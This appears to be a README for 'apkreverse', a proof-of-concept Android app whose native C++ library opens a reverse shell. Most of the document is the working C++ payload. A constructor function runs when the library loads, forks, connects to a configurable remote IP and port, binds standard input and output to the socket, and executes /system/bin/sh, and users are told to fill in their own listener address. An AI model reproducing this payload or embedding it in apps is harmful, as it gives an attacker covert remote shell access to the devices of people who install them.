# apkreverse

<p align="left">
	<a href="https://kotlinlang.org/"><img src="https://img.shields.io/badge/made%20with-Kotlin-purple"></a>
    <a href="https://learn.microsoft.com/pt-br/cpp/cpp/?view=msvc-170"><img src="https://img.shields.io/badge/made%20with-cpp-pink"></a>
	<a href="#"><img src="https://img.shields.io/badge/platform-osx%2Flinux%2Fwindows-blueviolet"></a>
</p>

`apkreverse` is simply a proof of concept (POC) of an application that runs reverse shell using `kotlin` and calling the native `C++` lib

# Usage
When performing the tests, change the IP and Port in the path found in app/src/main/cpp/reverseshell.cpp
```c++
#include <stdio.h>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h> //htons
#include <netinet/in.h>
#include <sys/types.h>

#define REMOTE_HOST "127.0.0.1" // Add IP
#define REMOTE_PORT 7070 // Add port

void __attribute__ ((constructor)) reverse()
{
    int s;
    struct sockaddr_in sa;

    if(fork() == 0) {

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_HOST);
        sa.sin_port = htons(REMOTE_PORT);

        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *) &sa, sizeof(sa));

        dup2(s, 0); // stdin
        dup2(s, 1); // stdout
        dup2(s, 2); // stderr

        execve("/system/bin/sh", 0, 0);
    }
}
```
